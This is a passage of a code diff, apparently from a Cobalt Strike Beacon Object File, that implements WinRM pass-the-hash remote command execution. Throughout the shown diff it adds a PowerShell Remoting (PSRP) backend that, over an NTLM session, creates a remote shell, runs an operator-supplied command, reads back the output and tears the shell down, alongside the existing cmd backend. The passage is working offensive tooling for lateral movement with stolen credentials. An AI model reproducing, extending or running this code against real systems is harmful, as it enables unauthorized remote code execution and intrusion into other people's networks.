+                timeoutSec, CMD_RESOURCE_URI);
+            if (sigSoap) {
+                char *r = NULL; DWORD rLen = 0, st = 0;
+                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
+                    sigSoap, (DWORD)MSVCRT$strlen(sigSoap),
+                    &r, &rLen, &st);
+                heap_free(sigSoap);
+                if (r) heap_free(r);
+                if (h) WINHTTP$WinHttpCloseHandle(h);
+            }
+        }
 
-        BOOL done = check_command_done(resp4);
-        heap_free(resp4);
-        WINHTTP$WinHttpCloseHandle(hReq4);
+    cleanup_cmd_shell:
+        {
+            char *delSoap = build_soap_delete(targetUrl, shellId,
+                timeoutSec, CMD_RESOURCE_URI);
+            if (delSoap) {
+                char *r = NULL; DWORD rLen = 0, st = 0;
+                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
+                    delSoap, (DWORD)MSVCRT$strlen(delSoap),
+                    &r, &rLen, &st);
+                heap_free(delSoap);
+                if (r) heap_free(r);
+                if (h) WINHTTP$WinHttpCloseHandle(h);
+            }
+        }
 
-        if (done) break;
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[*] WinRM PTH complete (backend: cmd)");
+        goto cleanup_http;
     }
+
+    /* -----------------------------------------------------------
+     * PowerShell backend lifecycle.
+     *
+     * The NTLM session is still valid after the text-shell
+     * AccessDenied -- the server authenticated us but denied
+     * shell/cmd.  The signing/sealing keys remain on the same
+     * underlying connection.
+     * ----------------------------------------------------------- */
 
     {
-        char *sigSoap = build_soap_signal(targetUrl, shellId, cmdId,
-                                          timeoutSec);
-        if (sigSoap) {
-            char *r = NULL; DWORD rLen = 0, st = 0;
-            HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
-                sigSoap, (DWORD)MSVCRT$strlen(sigSoap), &r, &rLen, &st);
-            heap_free(sigSoap);
-            if (r) heap_free(r);
-            if (h) WINHTTP$WinHttpCloseHandle(h);
-        }
-    }
+        BYTE psRpid[16], psPid[16];
+        char psShellId[128];
+        char psCmdId[128];
+        MSVCRT$memset(psShellId, 0, sizeof(psShellId));
+        MSVCRT$memset(psCmdId,   0, sizeof(psCmdId));
 
-cleanup_shell:
-    {
-        char *delSoap = build_soap_delete(targetUrl, shellId, timeoutSec);
-        if (delSoap) {
-            char *r = NULL; DWORD rLen = 0, st = 0;
-            HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
-                delSoap, (DWORD)MSVCRT$strlen(delSoap), &r, &rLen, &st);
-            heap_free(delSoap);
-            if (r) heap_free(r);
-            if (h) WINHTTP$WinHttpCloseHandle(h);
-        }
-    }
+        /* Generate RunspacePool and Pipeline GUIDs. */
+        ADVAPI32$SystemFunction036(psRpid, 16);
+        ADVAPI32$SystemFunction036(psPid,  16);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] WinRM PTH complete");
+        /* -- PSRP CreateShell ---------------------------------- */
+        char *psCreateSoap = build_soap_create_ps_shell(
+            targetUrl, timeoutSec, psRpid);
+        if (!psCreateSoap) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "Failed to build PSRP CreateShell SOAP");
+            goto cleanup_http;
+        }
+
+        char *psResp2 = NULL;
+        DWORD psResp2Len = 0, psStatus2 = 0;
+        HINTERNET psReq2 = wsman_post(hConnect, NULL, &ntlmSession,
+            psCreateSoap, (DWORD)MSVCRT$strlen(psCreateSoap),
+            &psResp2, &psResp2Len, &psStatus2);
+        heap_free(psCreateSoap);
+
+        if (!psReq2) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "PSRP CreateShell POST failed: %d",
+                KERNEL32$GetLastError());
+            if (psResp2) heap_free(psResp2);
+            goto cleanup_http;
+        }
+
+        if (psStatus2 == 401) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "PSRP shell creation returned 401. "
+                "The underlying connection may have changed; "
+                "re-authentication is needed.");
+            if (psResp2) heap_free(psResp2);
+            WINHTTP$WinHttpCloseHandle(psReq2);
+            goto cleanup_http;
+        }
+
+        if (psStatus2 != 200) {
+            print_http_fault("PSRP CreateShell", psStatus2,
+                             psResp2, psResp2Len);
+            if (psResp2) heap_free(psResp2);
+            WINHTTP$WinHttpCloseHandle(psReq2);
+            goto cleanup_http;
+        }
+
+        if (!extract_shell_id(psResp2, psShellId, sizeof(psShellId))) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "Failed to extract PSRP ShellId from response");
+            if (psResp2) heap_free(psResp2);
+            WINHTTP$WinHttpCloseHandle(psReq2);
+            goto cleanup_http;
+        }
+
+        if (psResp2) heap_free(psResp2);
+        WINHTTP$WinHttpCloseHandle(psReq2);
+
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[+] Shell created (PowerShell): %s", psShellId);
+
+        /* -- PSRP init Receive (drain RunspacePool messages) --- */
+        {
+            char *initRecvSoap = build_soap_receive(
+                targetUrl, psShellId, NULL,
+                timeoutSec, PS_RESOURCE_URI, "stdout");
+            if (initRecvSoap) {
+                char *initResp = NULL;
+                DWORD initRespLen = 0, initStatus = 0;
+                HINTERNET initReq = wsman_post(hConnect, NULL,
+                    &ntlmSession,
+                    initRecvSoap, (DWORD)MSVCRT$strlen(initRecvSoap),
+                    &initResp, &initRespLen, &initStatus);
+                heap_free(initRecvSoap);
+                if (!initReq || initStatus != 200) {
+                    print_http_fault("PSRP init Receive",
+                        initStatus, initResp, initRespLen);
+                    if (initResp) heap_free(initResp);
+                    if (initReq) WINHTTP$WinHttpCloseHandle(initReq);
+                    goto cleanup_ps_shell;
+                }
+                extract_psrp_stream_output(initResp);
+                heap_free(initResp);
+                WINHTTP$WinHttpCloseHandle(initReq);
+            }
+        }
+
+        /* -- PSRP Command (CREATE_PIPELINE) -------------------- */
+        char *psCmdSoap = build_soap_ps_command(
+            targetUrl, psShellId, cmdN, timeoutSec, psRpid, psPid);
+        if (!psCmdSoap) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "Failed to build PSRP Command SOAP");
+            goto cleanup_ps_shell;
+        }
+
+        char *psResp3 = NULL;
+        DWORD psResp3Len = 0, psStatus3 = 0;
+        HINTERNET psReq3 = wsman_post(hConnect, NULL, &ntlmSession,
+            psCmdSoap, (DWORD)MSVCRT$strlen(psCmdSoap),
+            &psResp3, &psResp3Len, &psStatus3);
+        heap_free(psCmdSoap);
+
+        if (!psReq3 || psStatus3 != 200) {
+            print_http_fault("PSRP Command", psStatus3,
+                             psResp3, psResp3Len);
+            if (psResp3) heap_free(psResp3);
+            if (psReq3) WINHTTP$WinHttpCloseHandle(psReq3);
+            goto cleanup_ps_shell;
+        }
+
+        if (!extract_command_id(psResp3, psCmdId, sizeof(psCmdId))) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "Failed to extract PSRP CommandId");
+            if (psResp3) heap_free(psResp3);
+            WINHTTP$WinHttpCloseHandle(psReq3);
+            goto cleanup_ps_shell;
+        }
+        if (psResp3) heap_free(psResp3);
+        WINHTTP$WinHttpCloseHandle(psReq3);
+
+        /* -- PSRP Receive loop --------------------------------- */
+        int psMaxIter = 50;
+        while (psMaxIter-- > 0) {
+            char *psRecvSoap = build_soap_receive(
+                targetUrl, psShellId, psCmdId,
+                timeoutSec, PS_RESOURCE_URI, "stdout");
+            if (!psRecvSoap) break;
+
+            char *psResp4 = NULL;
+            DWORD psResp4Len = 0, psStatus4 = 0;
+            HINTERNET psReq4 = wsman_post(hConnect, NULL, &ntlmSession,
+                psRecvSoap, (DWORD)MSVCRT$strlen(psRecvSoap),
+                &psResp4, &psResp4Len, &psStatus4);
+            heap_free(psRecvSoap);
+
+            if (!psReq4 || psStatus4 != 200) {
+                if (psResp4 && psResp4Len > 0) {
+                    print_http_fault("PSRP Receive", psStatus4,
+                                     psResp4, psResp4Len);
+                } else {
+                    BeaconPrintf(CALLBACK_ERROR,
+                        "PSRP Receive failed: HTTP %lu", psStatus4);
+                }
+                if (psResp4) heap_free(psResp4);
+                if (psReq4) WINHTTP$WinHttpCloseHandle(psReq4);
+                break;
+            }
+
+            /* Parse PSRP fragments from stream data. */
+            int psState = extract_psrp_stream_output(psResp4);
+
+            BOOL done = check_command_done(psResp4);
+            heap_free(psResp4);
+            WINHTTP$WinHttpCloseHandle(psReq4);
+
+            /* Pipeline terminal state or WSMan CommandState/Done. */
+            if (done || psState == PSRP_PS_COMPLETED ||
+                psState == PSRP_PS_STOPPED ||
+                psState == PSRP_PS_FAILED)
+                break;
+        }
+
+        /* -- PSRP Signal -------------------------------------- */
+        {
+            char *sigSoap = build_soap_signal(targetUrl, psShellId,
+                psCmdId, timeoutSec, PS_RESOURCE_URI);
+            if (sigSoap) {
+                char *r = NULL; DWORD rLen = 0, st = 0;
+                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
+                    sigSoap, (DWORD)MSVCRT$strlen(sigSoap),
+                    &r, &rLen, &st);
+                heap_free(sigSoap);
+                if (r) heap_free(r);
+                if (h) WINHTTP$WinHttpCloseHandle(h);
+            }
+        }
+
+    cleanup_ps_shell:
+        /* -- PSRP Delete -------------------------------------- */
+        {
+            char *delSoap = build_soap_delete(targetUrl, psShellId,
+                timeoutSec, PS_RESOURCE_URI);
+            if (delSoap) {
+                char *r = NULL; DWORD rLen = 0, st = 0;
+                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
+                    delSoap, (DWORD)MSVCRT$strlen(delSoap),
+                    &r, &rLen, &st);
+                heap_free(delSoap);
+                if (r) heap_free(r);
+                if (h) WINHTTP$WinHttpCloseHandle(h);
+            }
+        }
+
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[*] WinRM PTH complete (backend: PowerShell)");
+    }
 
 cleanup_http:
     if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
